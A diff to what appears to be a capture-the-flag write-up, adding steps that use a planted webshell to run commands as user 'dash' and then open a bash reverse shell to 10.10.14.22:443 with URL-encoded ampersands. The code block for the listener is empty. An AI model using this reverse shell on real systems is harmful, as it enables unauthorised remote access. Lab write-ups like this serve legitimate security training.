@@ -504,3 +504,39 @@ If we do it well, by clicking on `"Send"` and `"follow redirection"`, we will fo
 ![16](../../../assets/images/Usage/16.png)
 
 <br />
+
+Now we can browse our `webshell` and try to execute a `command`:
+
+<br />
+
+
+
+<br />
+
+As we can see, we are running commands as user `dash`:
+
+<br />
+
+To gain access to the system, we will use the typical bash `reverse shell`:
+
+(Important to `url-encode` ampersands to avoid errors -> %26)
+
+<br />
+
+```bash
+bash -i >%26 /dev/tcp/10.10.14.22/443 0>%261
+```
+
+<br />
+
+Check the listener:
+
+<br />
+
+```bash
+
+```
+
+<br />
+
+We're inside the system!
